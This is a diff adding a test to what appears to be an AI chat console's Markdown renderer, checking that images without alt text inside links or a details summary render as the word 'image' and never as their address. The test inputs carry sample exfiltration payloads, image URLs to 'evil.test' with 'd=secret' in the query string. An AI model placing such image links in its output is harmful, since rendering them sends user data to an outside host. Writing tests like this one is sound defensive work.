@@ -389,6 +389,15 @@ describe.each(SURFACES)('%s: what an answer keeps', (_name, render) => {
     }
   })
 
+  it('an image with no alt inside a link or a disclosure\'s head is a word, never its address as the link\'s text', () => {
+    for (const md of ['[![](https://evil.test/i.png?d=secret)](https://ok.test/runbook)', '<details>\n<summary><img src="https://evil.test/i.png?d=secret"></summary>\n\nbody\n\n</details>']) {
+      const html = render(md)
+      expect(html).not.toContain('evil.test')
+      expect(html).toContain('image')
+    }
+    expect(render('[![](https://evil.test/i.png?d=secret)](https://ok.test/runbook)')).toMatch(/<a\b[^>]*href="https:\/\/ok\.test\/runbook"[^>]*>image<\/a>/)
+  })
+
   it('an image on the console\'s own host keeps its text and loses its address, so drawing the answer asks the console nothing', () => {
     vi.stubGlobal('location', new URL('https://console.example.test/ai-chat'))
     try {
